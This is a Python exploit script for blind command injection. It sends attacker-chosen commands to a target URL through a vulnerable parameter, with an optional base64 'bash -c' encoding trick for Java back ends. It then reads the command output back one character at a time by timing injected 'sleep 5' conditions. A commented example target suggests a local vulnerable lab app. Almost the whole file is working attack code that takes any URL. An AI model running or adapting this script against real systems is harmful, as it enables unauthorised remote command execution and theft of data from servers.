import subprocess
import string
import time
import base64
import urllib.parse
import requests
import math
import datetime
import argparse

script_begins = time.perf_counter()

def java_exec_trick(payload):
    b64_cmd = base64.b64encode(payload.encode('ascii'))
    return "bash -c {{echo,{0}}}|{{base64,-d}}|bash".format(b64_cmd.decode('ascii'))

def url_encode(param):
    return urllib.parse.quote_plus(param)

def get_time_request(url):
    start = time.perf_counter()
    response = requests.get(url)
    request_time = time.perf_counter() - start
    return request_time

def crafted_parameter(payload,java=True):
    if java:
        return url_encode(java_exec_trick(payload))
    else:
        return url_encode(payload)

parser = argparse.ArgumentParser(description='Script to exploit a blind command injection')
parser.add_argument('--cmd', help='Command to inject.', required=True)
parser.add_argument('--url', help='URL of the target along with the vulnerable path.', required=True)
parser.add_argument('-v','--verbosity', action="count", default=0)
parser.add_argument('-o','--output', help='File to save the output.')
parser.add_argument('-j','--java', help='Encoding the payload for Java based targets. Note that Runtime.getRuntime().exec() does not support shell metacharacters.', action="store_true")
args = parser.parse_args()

#command = "ls -larth"
#url     = "http://192.168.179.132:8080/VulnWebApp_war_exploded/CmdiServlet?cmd={0}"

command=args.cmd
url=args.url
verbosity=args.verbosity
output=""
if args.output:
    output=args.output
enc_java=args.java

if enc_java and verbosity >= 1:
    print("Using encoding 'trick' for Java target")

print("Fetching output for command: {0}".format(command))
#Output size
payload = command + "| wc -l" + " | awk '{{ if (substr($0,{1},1)== \"{0}\") system(\"sleep 5\") }}'"
lines   = ""

for l in range(1,10): # 10 digits size? TODO: Think for greater numbers.
    # Checking EOL
    if math.ceil(get_time_request(url.format(crafted_parameter(payload.format('',l),enc_java)))) in range(5,8): # 5 to 8 secs, considering some network delay
        if verbosity >= 1:
            print("Found EOL")
        break
    for x in range(10):
        if math.ceil(get_time_request(url.format(crafted_parameter(payload.format(x,l),enc_java)))) in range(5,8):
            if verbosity >= 1:
                print("Found digit: " + str(x))
            lines += str(x)
            break

print("Lines of output: {0}".format(lines))

# Guessing output
# FNR tells awk which line to use
payload = command + "| awk 'FNR=={2} {{ if (substr($0,{1},1)== \"{0}\") system(\"sleep 5\") }}'"

content = ""
line = 1
f = 1
while True:
    if math.ceil(get_time_request(url.format(crafted_parameter(payload.format('',f,line),enc_java)))) in range(5,8):
        if verbosity >= 1:
            print("Found EOL")
        line+=1
        f=1
        content+="\n\r"
    
    if line > int(lines):
        break

    #Guessing lines
    for g in string.printable:  # ASCII printable chars
        gi = g
        if g in string.punctuation: # Punctuation symbols
            st = '{0}'
            #print(g)
            # I need to escape some chars becuase are breaking the payload
            if '\\' in g:
                gi  = st.format('\\') + g
            if '\'' in g:
                gi  = st.format('\'')
            if '"' in g:
                gi  = st.format('\\') + g
        if math.ceil(get_time_request(url.format(crafted_parameter(payload.format(gi,f,line),enc_java)))) in range(5,8):
            if verbosity >= 1:
                print("Found char: " + str(g))
            content+= str(g)
            f+=1
            break

print("Guessing output:\n\r")
print(content)
print("--- Real time {0}  ---".format(str(datetime.timedelta(seconds=(time.perf_counter() - script_begins)))))
if output:
    fh = open(output, 'w')
    fh.write(content)
    fh.close()
    print("Output saved in: {0}".format(output))
